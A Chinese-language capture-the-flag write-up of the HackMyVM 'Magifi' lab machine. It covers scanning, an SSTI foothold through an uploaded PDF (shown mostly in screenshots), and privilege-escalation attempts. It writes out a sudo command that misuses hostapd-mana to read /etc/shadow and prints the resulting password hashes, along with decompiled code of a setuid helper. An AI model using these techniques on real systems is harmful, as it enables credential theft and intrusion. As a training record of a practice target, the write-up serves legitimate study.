---
title: hackmyvm Magifi靶机复盘
author: LingMj
data: 2025-03-01
categories: [hackmyvm]
tags: [ssti,wifi]
description: 难度-Hard
---

## 网段扫描
```
root@LingMj:~# arp-scan -l
Interface: eth0, type: EN10MB, MAC: 00:0c:29:d1:27:55, IPv4: 192.168.137.190
Starting arp-scan 1.10.0 with 256 hosts (https://github.com/royhills/arp-scan)
192.168.137.1	3e:21:9c:12:bd:a3	(Unknown: locally administered)
192.168.137.31	3e:21:9c:12:bd:a3	(Unknown: locally administered)
192.168.137.92	62:2f:e8:e4:77:5d	(Unknown: locally administered)
192.168.137.253	a0:78:17:62:e5:0a	Apple, Inc.

8 packets received by filter, 0 packets dropped by kernel
Ending arp-scan 1.10.0: 256 hosts scanned in 2.159 seconds (118.57 hosts/sec). 4 responded
```

## 端口扫描

```
root@LingMj:~# nmap -p- -sV -sC 192.168.137.31
Starting Nmap 7.95 ( https://nmap.org ) at 2025-03-01 04:14 EST
Nmap scan report for hogwarts.htb (192.168.137.31)
Host is up (0.037s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.11 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 0c:c6:d6:24:1e:5b:9e:66:25:0a:ba:0a:08:0b:18:40 (RSA)
|   256 9c:c3:1d:ea:22:04:93:b7:81:dd:f2:96:5d:f0:1f:9b (ECDSA)
|_  256 55:41:15:90:ff:1d:53:88:e7:65:91:4f:fd:cf:49:85 (ED25519)
80/tcp open  http    Werkzeug httpd 3.0.4 (Python 3.8.10)
|_http-title: Hogwarts School
|_http-server-header: Werkzeug/3.0.4 Python/3.8.10
MAC Address: 3E:21:9C:12:BD:A3 (Unknown)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 18.52 seconds
```

## 获取webshell

![picture 0](../assets/images/5bafe5b667c3eb1649b83564db08fe1b664e766bf20c37146dae4396e02f91ca.png)  

>存在域名
>

![picture 1](../assets/images/d430028bfe9461aa0457642f450d750e05f3b4305f0ff110bf3b9e686fe31325.png)  

![picture 2](../assets/images/7bec8a9e4b59551571517b5a818aa811c2bc066184af47574110250e2d06a695.png)  

>upload上传内容为pdf，有一个模版
>

![picture 3](../assets/images/5bad62592e07410d4cab7bc18fcbfd54ad6bbb7c04db60dab88a1f26b86144dd.png)  

![picture 4](../assets/images/d69fdbdbc24893d592278894e5f24c27ccbb725b8b6fcc0c20c4aca7ddf2eceb.png)  


>由于直接使用wps会出现字体报错，这里使用pages来进行pdf导出
>

![picture 5](../assets/images/8ae430308e0912bfe1be5e7a8f902c25bb770dd998abc2ea802cf93500fbe810.png)  

![picture 6](../assets/images/e7e38319709d69c7f700787e1055a65afaaae0b0431fc897e76a1c1ec6b351e3.png)  

![picture 7](../assets/images/1e9701a54dd9ee4f207b188f05ced196222990474305b62d4b8f690e12d4cc75.png)  


>可以看到pdf完成上传并且stti注入成功，推荐一个网站：https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Server%20Side%20Template%20Injection/Python.md
>

![picture 8](../assets/images/22069402133640664f877c2fb73b81972b3e463e0c92f3f94e902b1be4ddbdf0.png)  

>这个部分我研究了半小时直接pages进行修改poc是无法注入成功的需要在本地进行相应的转换操作才能注入成功，这里我不演示了，因为不是所有人都有这个问题
>

![picture 9](../assets/images/09652b2ce0cadfcc4e113604cfaab2dde47e7e870973474c6ff2c512c05a8365.png)  

>没有nc 直接注入没成功可以使用curl的形式
>

![picture 10](../assets/images/0c5f440aa16ff1cde91df26ddf043f247c1a7e90f1ea6a9a81939e5f4d46e5ac.png)  
![picture 11](../assets/images/1cb75abc34020710ad018dd48120a47c55f7cef32286e8c178393715f2f4332e.png)  
![picture 12](../assets/images/a4a8c3b5d3329d6816b1e1797172e53dd26303275915cbe9d39a5cf4fe3f62bb.png)  
![picture 13](../assets/images/3c8f8050fa38ddc12678703de70c5258058c716de9b236e652d47fc6c53b374b.png)  

>接下来就是稳定shell和提权操作了
>


## 提权

```
harry_potter@MagiFi:~/Hogwarts_web$ sudo -l
Matching Defaults entries for harry_potter on MagiFi:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User harry_potter may run the following commands on MagiFi:
    (root) NOPASSWD: /usr/sbin/aireplay-ng, /usr/sbin/airmon-ng, /usr/sbin/airodump-ng, /usr/bin/airdecap-ng, /usr/bin/hostapd-mana
harry_potter@MagiFi:~/Hogwarts_web$ 


```

>这个靶机之前是有bug的但是我今天测了一下午bug不能直接使用，现在我演示一下bug的方案，因为不成功所以放出来没啥关系
>

```
harry_potter@MagiFi:~/Hogwarts_web$ sudo /usr/bin/hostapd-mana /root/root.txt
Configuration file: /root/root.txt
Could not open configuration file '/root/root.txt' for reading.
Failed to set up interface with /root/root.txt
Failed to initialize interface
harry_potter@MagiFi:~/Hogwarts_web$ sudo /usr/bin/hostapd-mana /etc/shadow
Configuration file: /etc/shadow
Line 1: invalid line 'root:$6$KflwZsO6c4DW8laq$AVs2hfT9i1calD.V6aKIr5Wej26J1tjgSz5R674SSJDuWvX1RWqHYw79Q.OIqeIlhl0ksI7UJ7d0YHJp4F.J81:19993:0:99999:7:::'
Line 2: invalid line 'daemon:*:19430:0:99999:7:::'
Line 3: invalid line 'bin:*:19430:0:99999:7:::'
Line 4: invalid line 'sys:*:19430:0:99999:7:::'
Line 5: invalid line 'sync:*:19430:0:99999:7:::'
Line 6: invalid line 'games:*:19430:0:99999:7:::'
Line 7: invalid line 'man:*:19430:0:99999:7:::'
Line 8: invalid line 'lp:*:19430:0:99999:7:::'
Line 9: invalid line 'mail:*:19430:0:99999:7:::'
Line 10: invalid line 'news:*:19430:0:99999:7:::'
Line 11: invalid line 'uucp:*:19430:0:99999:7:::'
Line 12: invalid line 'proxy:*:19430:0:99999:7:::'
Line 13: invalid line 'www-data:*:19430:0:99999:7:::'
Line 14: invalid line 'backup:*:19430:0:99999:7:::'
Line 15: invalid line 'list:*:19430:0:99999:7:::'
Line 16: invalid line 'irc:*:19430:0:99999:7:::'
Line 17: invalid line 'gnats:*:19430:0:99999:7:::'
Line 18: invalid line 'nobody:*:19430:0:99999:7:::'
Line 19: invalid line 'systemd-network:*:19430:0:99999:7:::'
Line 20: invalid line 'systemd-resolve:*:19430:0:99999:7:::'
Line 21: invalid line 'systemd-timesync:*:19430:0:99999:7:::'
Line 22: invalid line 'messagebus:*:19430:0:99999:7:::'
Line 23: invalid line 'syslog:*:19430:0:99999:7:::'
Line 24: invalid line '_apt:*:19430:0:99999:7:::'
Line 25: invalid line 'tss:*:19430:0:99999:7:::'
Line 26: invalid line 'uuidd:*:19430:0:99999:7:::'
Line 27: invalid line 'tcpdump:*:19430:0:99999:7:::'
Line 28: invalid line 'landscape:*:19430:0:99999:7:::'
Line 29: invalid line 'pollinate:*:19430:0:99999:7:::'
Line 30: invalid line 'fwupd-refresh:*:19430:0:99999:7:::'
Line 31: invalid line 'usbmux:*:19991:0:99999:7:::'
Line 32: invalid line 'sshd:*:19991:0:99999:7:::'
Line 33: invalid line 'systemd-coredump:!!:19991::::::'
Line 34: invalid line 'lxd:!:19991::::::'
Line 35: invalid line 'freerad:*:19991:0:99999:7:::'
Line 36: invalid line 'rubeus.hagrid:!:19991:0:99999:7:::'
Line 37: invalid line 'albus.dumbledore:!:19991:0:99999:7:::'
Line 38: invalid line 'minerva.mcgonagall:!:19991:0:99999:7:::'
Line 39: invalid line 'tom.riddle:$6$l2y72YLXF2tIL.rC$d3SQEKFlGu9wi/omLDmHJYGP3uRSD9t2hnRTqveIMOHG8pa80Ku81d3kbfXZy0bpC2PRp9xLqE7IQi3EQ4bf1/:19991:0:99999:7:::'
Line 40: invalid line 'harry_potter:$6$Cu5tGqfYYF/NWp6f$bLb5lfce4bMH10OYBG27nYBoMTMciI9NOxIR2XGliWIhzHE2iU0kS1ZKuSNPnYRS/y12jnt4jmr8pMfDsRicK1:19993:0:99999:7:::'
40 errors found in configuration file '/etc/shadow'
Failed to set up interface with /etc/shadow
Failed to initialize interface
harry_potter@MagiFi:~/Hogwarts_web$ 
```

>这里能看到不能读取/root/root.txt,但是能读取shadow，我尝试爆破密码没见成功
>

![picture 14](../assets/images/177edd0d36e473f0eaf7fb1ae474ca2f0edb2c17e14d0c16920ae63dddf90f7b.png)  

>我想说bug还有但是root好像加权限了，接下来演示第二个
>

![picture 15](../assets/images/867345238c394c670a359d0dcbcc73a197e4c80d9d94242663971f04dca93705.png)  

>这里发现无法直接使用这个xxd的东西，我看了一下原码它进行了uid的识别，它给了tom的特定用户
>

![picture 16](../assets/images/2873ff0d92a0d0733dfb5e6aada7ac80bd4887c57ff5633e9dc61ce61da139fb.png)  

```
int __fastcall main(int argc, const char **argv, const char **envp)
{
  __uid_t v3; // eax
  int i; // [rsp+10h] [rbp-20h]
  int fd; // [rsp+14h] [rbp-1Ch]
  char *s1; // [rsp+18h] [rbp-18h]
  struct passwd *v8; // [rsp+28h] [rbp-8h]

  s1 = 0LL;
  v3 = getuid();
  v8 = getpwuid(v3);
  if ( v8 && !strcmp(v8->pw_name, "tom.riddle") )
  {
    if ( argc <= 1 || !strcmp(argv[1], "-h") || !strcmp(argv[1], "--help") )
    {
      show_help();
      return 1;
    }
    else
    {
      for ( i = 1; i < argc; ++i )
      {
        if ( !strcmp(argv[i], "-O") && argc > i + 1 )
        {
          s1 = (char *)argv[i + 1];
          argv[i] = 0LL;
          argv[i + 1] = 0LL;
          break;
        }
        if ( !strncmp(argv[i], "/root/", 6uLL) || !strncmp(argv[i], "/etc/", 5uLL) )
        {
          fwrite("I hate dealing with Muggle gadgets!\n", 1uLL, 0x24uLL, stderr);
          return 1;
        }
      }
      if ( s1 )
      {
        if ( !strcmp(s1, ".horcrux.png") )
        {
          fd = open(s1, 577, 384LL);
          if ( fd >= 0 )
          {
            if ( dup2(fd, 1) >= 0 )
            {
              close(fd);
              execvp("/usr/bin/xxd", (char *const *)argv);
              perror("Error executing xxd");
            }
            else
            {
              perror("Error redirecting output to file");
              close(fd);
            }
            return 1;
          }
          else
          {
            perror("Error opening output file");
            return 1;
          }
        }
        else
        {
          fwrite("Not every wizards can use or destroy a Horcrux!\n", 1uLL, 0x30uLL, stderr);
          return 1;
        }
      }
      else
      {
        fwrite("Error: Output file can't be empty, use the -O option.\n", 1uLL, 0x36uLL, stderr);
        show_help();
        return 1;
      }
    }
  }
  else
  {
    fwrite("You are not worthy to handle the Horcrux!\n", 1uLL, 0x2AuLL, stderr);
    return 1;
  }
}
```

>当然我想过了uid的绕过但是我感觉应该是成功不了的，到这里目前看的bug貌似修复了很多，但是感觉还是存在，但是我对于wifi这个玩意真不熟测试uid之后就搁置了
>


>userflag:hogwarts{ea4bc74f09fb69771165e57b1b215de9}
>
>rootflag:
>
